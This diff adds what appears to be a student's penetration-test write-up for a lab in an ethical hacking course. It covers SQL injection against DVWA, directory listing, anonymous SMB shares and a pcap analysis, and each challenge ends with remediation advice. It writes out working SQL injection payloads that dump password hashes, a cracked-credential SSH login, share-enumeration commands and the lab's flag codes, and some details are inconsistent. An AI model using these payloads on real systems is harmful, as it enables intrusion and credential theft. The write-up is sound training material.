@@ -1,0 +1,166 @@
+BACKGROUND/SCENARIO
+  You have been hired to conduct a penetration test for a customer. At the conclusion of the test, the customer has requested a complete report that includes any vulnerabilities discovered,   successful exploits, and remediation steps to protect vulnerable systems. You have access to hosts on the 10.5.5.0 and 192.168.0.0/24 networks.
+
+REQUIRED RESOURCE
+	Kali VM customized for the Ethical Hacker course
+
+INSTRUCTIONS
+Challenge 1: SQL Injection
+
+In this part, you must discover user account information on a server and crack the password of Bob Smith's account. You will then locate the file with Challenge 1 code and use Bob Smith's account credentials to open the file at 192.168.0.10 to view its contents
+STEPS FOLLOWED: 
+a.	Open a browser and go to the website at 10.5.5.12.
+b.	Login with the credentials admin / password.
+c.	Set the DVWA security level to low and click Submit
+d. To check if sql injection can be carried out: ‘ OR 1=1#
+e. Retrieve table names from db: 1' OR 1=1 UNION SELECT 1,table_name FROM information_schema.tables WHERE table_type='base table' AND table_schema='dvwa'#
+f. Output returns table ‘guestbook’ and ‘users’.
+    - ‘users’ is mostly likely going to have login information for the users including password hashes
+g. Retrieve column names from the user table: 1' OR 1=1 UNION SELECT 1,column_name FROM information_schema.columns WHERE table_name='users'#
+   - The two columns of interest were user and password
+h. Retrieve user credentials from users table: 1' OR 1=1 UNION SELECT user, password FROM users #
+i. Used crackstation.net to crack Bob Smith’s password which was – ‘password’ username ‘smithy’
+j. Used hacked credentials to log in as John Smith into 192.168.0.10
+   - Used ssh smithy@192.168.0.10 (Did not work) older version of ssh
+   - What worked: ssh -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedAlgorithms=+ssh-rsa username@192.168.0.10
+flag 1: The code for this challenge is 8748wf8J.
+
+REMEDIATIONS FOR SQL INJECTION:  
+- Use Prepared Statements (Parameterized Queries)
+- Input Validation and Sanitization
+- Stored Procedures
+- Principle of Least Privilege
+- Web Application Firewall (WAF)
+- Escaping user input, ORM frameworks, regular security testing, and error handling that doesn't reveal database structure.
+TOOLS/CONCEPTS USED: 
+DVWA, SQL, SSH, Crackstation
+
+  
+CHALLENGE 2: Web Server Vulnerabilities 
+In this part, you must find vulnerabilities on an HTTP server. Misconfiguration of a web server can allow for the listing of files contained in directories on the server. You can use any of the tools you learned in earlier labs to perform reconnaissance to find the vulnerable directories.
+In this challenge, you will locate the flag file in a vulnerable directory on a web server.
+
+STEPS: 
+a.	If not already, log into the server at 10.5.5.12 with the admin / password credentials.
+b.	Set the application security level to low.
+-	Use nikto to perform reconnaissance: nikto -h 10.5.5.12
+-	Directories listed which allow indexing - /config/ and /doc/
+-	Using 10.5.5.12/config/ - I could view the db_form.html
+-	Flag 2: The code for the flag is: aWe-4975 (contained in db_form.html)
+
+REMEDIATION FOR DIRECTORY LISTING
+1. Disable Directory Indexing/Browsing
+  •	Web servers: Configure to prevent automatic directory listings
+    o	Apache: Options -Indexes in .htaccess or httpd.conf
+    o	Nginx: autoindex off; in server block
+    o	IIS: Disable "Directory Browsing" feature
+  •	File shares: Disable anonymous enumeration
+    o	SMB: Restrict Everyone group permissions
+    o	FTP: Disable LIST command for anonymous users
+2. Implement Access Controls & Authentication
+  •	Require authentication for directory access
+  •	Principle of least privilege - only necessary users/groups
+  •	Network segmentation - restrict to internal networks
+  •	IP whitelisting - allow only trusted sources
+  •	Use robots.txt to block crawlers (though not a security measure)
+Additional: Remove default index files (index.html, default.htm), use proper file permissions, and regularly audit exposed directories.
+TOOLS/CONCEPTS USED: Nikto, DVWA, Directory listing. 
+
+
+CHALLENGE 3: Exploit open SMB Server Shares
+In this part, you want to discover if there are any unsecured shared directories located on an SMB server in the 10.5.5.0/24 network. You can use any of the tools you learned in earlier labs to find the drive shares available on the servers.
+
+STEPS: 
+Use scanning tools to scan the 10.5.5.0/24 LAN for potential targets for SMB enumeration.
+Question
+Which host on the 10.5.5.0/24 network has open ports indicating it is likely running SMB services
+a. Used Nmap -sN 10.5.5.0/24, SMB ports were all closed
+b. Used Nmap -sN -p 139, 445 10.5.5.0/24, SMB ports were all still closed
+c. Used nmap -p 139,445 --script smb-enum-shares,smb-enum-users 10.5.5.0/24; SMB ports were still closed
+d. Used: sudo ufw allow 139/tcp; result: ufw command not recognised. 
+e. Lastly, reinstalled the Kali. 
+d. Ran Nmap -sN 10.5.5.0/24l; Open ports included tcp 139 netbios, and tcp 445 smb; Host with open ports above – 10.5.5.14
+e. Enum4linux -a 10.5.5.14
+  - Shares listed on the smb server: homes, workfiles, print$, IPC$
+  - Files accessible without login: workfiles, print$ and IPC$
+  - Login to workfiles: smbclient //10.5.5.14/workfiles; Password: (enter)
+Dir output: 
+..                                  D        0  Fri Aug 13 20:15:47 2021
+
+f. Finally access: smbclient //10.5.5.14/print$ ->  dir -> cd OTHER -> get sxij42.txt -> quit -> cat sxij42.txt
+  -  cat doesn’t work on smb, I downloaded using get <filename.txt>
+  - Exited. And used cat on the normal root terminal,
+found the flag for Challenge 3!  
+The code for this challenge is NWs39691.
+
+REMEDIATION: preventing SMB server access:
+1. Block SMB Ports at Firewall
+•	Block TCP ports: 139 (NetBIOS) and 445 (SMB)
+•	Block UDP ports: 137 (NetBIOS Name Service) and 138 (NetBIOS Datagram)
+•	Implementation:
+bash
+# Linux iptables
+    iptables -A INPUT -p tcp --dport 445 -j DROP
+    iptables -A INPUT -p tcp --dport 139 -j DROP
+
+# Windows Firewall
+    New-NetFirewallRule -DisplayName "Block SMB" -Direction Inbound -Protocol TCP -LocalPort 445,139 -Action Block
+2. Disable SMB Services
+•	Windows: Stop and disable the Server service
+    PowerShell
+    Stop-Service LanmanServer -Force
+    Set-Service LanmanServer -StartupType Disabled
+
+# For newer Windows (SMBv1 specific)
+    Disable-WindowsOptionalFeature -Online -FeatureName SMB1Protocol
+•	Linux (Samba): Stop and disable smbd/nmbd
+bash
+sudo systemctl stop smbd nmbd
+    sudo systemctl disable smbd nmbd
+    sudo apt remove samba --purge  # Complete removal
+3. Additional methods: Network segmentation, VPN-only access, SMB signing enforcement, and disabling null sessions.
+
+TOOLS/CONCEPTS USED: 
+  nmap, enum4linux, shell commands, smbclient
+
+
+
+CHALLENGE 4: Analyze a .pcap file to find information.
+As part of your reconnaissance effort, your team captured traffic using Wireshark. The capture file, SA.pcap, is located in the Downloads subdirectory within the kali user home directory.
+Open VA.pcap from downloads
+Filtered for http
+Viewed HTTP responses for possible content that might lead to flags
+IP of target 10.5.5.11
+URL: http://10.5.5.11/data/user_accounts.xml
+Directories revealed: /test/, /passwords/, /data/, /includes/
+
+<UserName>Flag</UserName>
+<Password>Here is the Code for Challenge 4!</Password>
+<Signature>21z-1478K</Signature>
+<Type>Flag</Type>
+
+TOOLS/CONCEPTS USED: 
+Wireshark, packet filtering, web browser, directory listing. 
+
+REMEDIATIONS: 
+1. Transport Layer Encryption (Most Critical); HTTPS/TLS for Web Services
+2. Encryption at Rest; File Encryption Before Transmission
+3. Secure Protocols for Different Services
+4. SSH for Secure File Transfer; SCP/SFTP instead of FTP
+5. Application-Level Encryption; Encrypt Sensitive Data Before Git Commit
+6. Network Security Measures; VPN for Internal Transfers
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
